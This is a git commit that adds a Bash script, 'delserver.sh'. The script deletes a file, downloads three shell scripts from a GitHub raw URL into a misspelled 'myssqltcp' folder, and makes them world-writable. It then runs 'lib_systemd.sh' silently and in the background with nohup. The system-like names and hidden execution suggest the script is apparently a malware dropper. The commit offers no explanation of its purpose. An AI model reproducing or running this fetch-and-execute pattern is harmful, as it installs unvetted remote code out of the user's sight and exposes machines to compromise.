a2b08209af190f872f8e7e41fa37b621e3379dd2
teshushu <905353149@qq.com>
2023-01-22 07:37:18 +0800

    Create delserver.sh

---
+++ Bash/url/delserver.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+if [ -z $HOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+cd /$HOME/
+rm -f mysqltcp.sh
+
+cd $HOME/myssqltcp/
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh
+chmod 777 lib_systemd.sh
+chmod 777 addconf.sh
+chmod 777 logserver.sh
+/bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
+nohup ./lib_systemd.sh > /dev/null 2>&1 &
+echo "[*] Yes-Go"
